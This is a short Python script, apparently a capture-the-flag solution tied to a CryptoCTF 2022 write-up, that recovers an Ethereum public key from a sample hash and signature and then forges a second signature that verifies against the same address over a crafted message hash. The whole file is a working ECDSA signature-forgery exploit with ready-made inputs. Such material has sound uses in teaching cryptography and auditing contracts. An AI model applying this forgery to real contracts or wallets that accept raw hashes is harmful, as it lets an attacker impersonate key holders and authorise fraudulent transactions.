#!/usr/bin/python3
# Author: SI
# Reference 1: https://cryptoctf.org/2022/09/11/writeup-of-flag-submission-forgery-by-si/
# Reference 2: https://polygonscan.com/address/0x36a1424da63a50627863d8f65c0669da7347814a
# Reference 3: https://gist.github.com/chjj/4fe8f5b2b489e89e6ed4

from eth_account.account import to_standard_signature_bytes
from eth_keys import keys
from eth_utils import (big_endian_to_int, to_bytes)
from hexbytes import HexBytes
from eth_keys.backends.native.jacobian import (inv, fast_multiply, fast_add)
from eth_keys.constants import (SECPK1_G as G, SECPK1_N as N)

def recover_public_key(message_hash, signature):
	message_hash_bytes = HexBytes(message_hash)
	if len(message_hash_bytes) != 32:
		raise ValueError("The message hash must be exactly 32-bytes")
	signature_bytes = HexBytes(signature)
	signature_obj = keys.Signature(signature_bytes = to_standard_signature_bytes(signature_bytes))
	return signature_obj.recover_public_key_from_msg_hash(message_hash_bytes)

def forge(public_key, a = 0, b = 1):
	t = public_key.to_bytes()
	Y = big_endian_to_int(t[:32]), big_endian_to_int(t[32:])

	r, y = fast_add(fast_multiply(G, a), fast_multiply(Y, b))

	s_raw = r * inv(b, N) % N
	v_raw = (y % 2) ^ (0 if s_raw * 2 < N else 1)
	s = s_raw if s_raw * 2 < N else N - s_raw
	v = v_raw + 27

	z = a * s_raw % N

	eth_signature_bytes = to_bytes(r).rjust(32, b'\0') + to_bytes(s).rjust(32, b'\0') + to_bytes(v)

	return '0x' + to_bytes(z).rjust(32, b'\0').hex(), '0x' + eth_signature_bytes.hex()

#hsh = '0xe50051a0af89748fe098cef3b163b6dc586a664e726791bb2a582ad364f42683'
#sig = '0x2bdbc1826efc039719a28a9f4dbab9f4a2692d83de478300261a0e49019b63ee67c202ecc4ebdf82693da47824ac4fcf21f793400d85696034c4de9537c6ce491b'
hsh = '0xbb272d3dc886fccf69f92cd7cb622501c02627c045fb38053f78af2dca68e188'
sig = '0x30410a2d097af2b27ba3d789ce151c6aed0590f71b4c7b67d4ae91f56659f2297c3a2f8155d9fb9d30682e599b31012b51cb0928578e97f2f3f0c306597d2eec1c'

pub = recover_public_key(hsh, sig)
addr = pub.to_checksum_address()
print('recovered (checksum) address:', addr)

a, b = 0, 1
fhsh, fsig = forge(pub, a, b)
print('forged message hash:', fhsh)
print('forged signature:', fsig)

fpub = recover_public_key(fhsh, fsig)
faddr = fpub.to_checksum_address()
print('recovered address check:', 'correct' if faddr == addr else 'wrong!')
